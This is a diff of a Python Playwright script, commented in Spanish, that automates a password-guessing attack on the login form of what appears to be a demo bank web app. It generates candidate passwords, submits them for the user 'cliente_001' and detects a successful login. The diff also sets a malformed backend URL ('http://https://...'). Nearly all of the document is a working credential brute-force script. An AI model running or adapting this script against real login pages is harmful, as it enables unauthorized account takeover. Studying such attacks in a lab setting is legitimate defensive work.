@@ -1,8 +1,12 @@
 import asyncio
-import time
 from playwright.async_api import async_playwright
 
-HTML_URL = "https://statue-essential-dirtiness.ngrok-free.dev"  # la URL donde corre tu frontend
+# 1. Dirección del HTML en el navegador (Live Server / Frontend)
+HTML_URL = "http://127.0.0.1:5500/index.html"  # Revisa el puerto de tu Live Server
+
+# 2. Dirección de la API en Python (Backend)
+BACKEND_URL = "http://https://statue-essential-dirtiness.ngrok-free.dev"
+
 TARGET_USER = "cliente_001"
 
 # Generación heurística de contraseñas
@@ -21,41 +25,45 @@ def generate_passwords():
                 generated.add(f"Banco$ecure#{yr}")
     return list(generated)
 
-async def run_gui_adaptive_bot():
+async def run_gui_bot():
     candidates = generate_passwords()
-    print(f"🤖 [BOT GUI] Iniciando simulación visual con {len(candidates)} candidatas...")
-
+    
     async with async_playwright() as p:
-        # headless=False abre la ventana del navegador para que veas la interacción
-        browser = await p.chromium.launch(headless=False, slow_mo=50)
+        browser = await p.chromium.launch(headless=False, slow_mo=100)
         page = await browser.new_page()
 
-        for attempt, pwd in enumerate(candidates, 1):
-            print(f"🤖 Intento {attempt}: Ingresando contraseña '{pwd}'...")
-            
-            # 1. Abre o recarga la página de inicio
-            await page.goto(HTML_URL)
+        print("🤖 [BOT] Cargando interfaz visual...")
+        await page.goto(HTML_URL)
 
-            # 2. Llena los campos en la interfaz
+        # --- PASO CRÍTICO: Configurar la URL del Backend en la UI ---
+        # Si el input tiene ID o placeholder, lo llenamos para asegurar la conexión
+        backend_input = page.locator("input[value*='localhost'], #backendUrl, input[placeholder*='8000']").first
+        if await backend_input.is_visible():
+            await backend_input.fill(BACKEND_URL)
+            print(f"🔗 URL del backend vinculada en la UI: {BACKEND_URL}")
+
+        # Bucle de ataques heurísticos en la interfaz
+        for attempt, pwd in enumerate(candidates, 1):
+            print(f"🤖 Intento {attempt}: Probando '{pwd}'...")
+
+            # Completa campos de login
             await page.fill("#username", TARGET_USER)
             await page.fill("#password", pwd)
-            
-            # 3. Hace clic en el botón de login
-            await page.click("#btnLogin")
-            
-            # Espera breve para verificar si la interfaz cambió o si dio error
+
+            # Clic en "Iniciar sesión"
+            await page.click("button:has-text('Iniciar sesión'), #btnLogin")
+
             await page.wait_for_timeout(1000)
 
-            # Si el elemento de la vista post-login aparece, el ataque tuvo éxito
-            if await page.is_visible("#viewTxn"):
-                print(f"✅ ¡Éxito en la interfaz! Contraseña correcta: '{pwd}'")
+            # Si pasa al PASO 2 (transacción), la contraseña fue exitosa
+            if await page.is_visible("#viewTxn, text='PASO 2'"):
+                print(f"✅ ¡Login exitoso en la UI! Contraseña: '{pwd}'")
                 await page.wait_for_timeout(3000)
                 await browser.close()
                 return
 
-            print(f"❌ Intento {attempt} fallido en la interfaz.")
-
+        print("❌ Ninguna contraseña funcionó.")
         await browser.close()
 
 if __name__ == "__main__":
-    asyncio.run(run_gui_adaptive_bot())
+    asyncio.run(run_gui_bot())
